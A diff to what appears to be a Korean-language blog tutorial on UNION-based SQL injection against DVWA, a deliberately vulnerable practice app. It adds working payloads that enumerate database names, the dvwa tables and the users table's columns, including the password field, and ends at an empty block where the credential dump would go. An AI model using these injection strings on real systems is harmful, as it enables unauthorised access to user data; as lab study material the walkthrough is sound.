@@ -124,10 +124,51 @@ UNION을 이용한다면 DB의 모든 정보를 알아낼 수 있다. UNION을 �
 다른 방법을 이용해서도 칼럼갯수를 알 수 있다. 바로 `ORDER BY`라는 키워드를 이용하는 것이다. 이 키워드는 어떤 칼럼을 기준으로 정렬할때 쓰는 구문인데 칼럼의 갯수보다 크면 에러가 발생하게 된다. 따라서 원래 칼럼갯수를 맞출 수 있다. 
 
 2일때, 
+
 ![image](https://user-images.githubusercontent.com/53431568/126732412-d6fe50ed-46c4-4b81-85a3-ef6f2fb0af6e.png)
 
 3일때, 3이라는 칼럼을 알 수 없다라는 에러메세지를 출력한다. 따라서 2개의 칼럼까지 있다는 것을 알 수 있다. 
 ![image](https://user-images.githubusercontent.com/53431568/126732428-2d3c492c-92a4-46cb-9dd5-9f0b3d9c7e42.png)
+
+이제 union 공격을 해보자!🙋🏽🙋🏽
+
+
+
+#### 데이터베이스 명 조회
+~~~sql 1' union select schema_name,1 from information_schema.schemata #~~~
+
+
+![image](https://user-images.githubusercontent.com/53431568/126734180-ee4edb97-9856-46f9-9c3c-71c3d9ca07d5.png)
+
+
+#### dvwa 데이터베이스의 테이블 명 조회
+~~~sql 1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #~~~
+ 
+ guestbook, users 라는 테이블이 있는 것을 확인할 수 있다. 개인정보가 있는것처럼 보이는 users 테이블을 살펴보도록 한다.
+ 
+![image](https://user-images.githubusercontent.com/53431568/126734262-bc25ea5c-2802-4bd8-95bf-d94b0cbc18cb.png)
+
+
+
+#### users 테이블 칼럼 조회
+~~~sql 1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'#~~~ 
+
+user_id, first name, surname, passwd 를 보여준다.
+
+![image](https://user-images.githubusercontent.com/53431568/126734314-e90e55e6-27e0-42a2-bd36-83dff156ba39.png)
+
+
+
+이제, users 테이블에서 사용자이름과 password 만 출력해보자
+
+~~~sql 
+
+~~~
+
+
+
+
+
 
 <br><br>
 
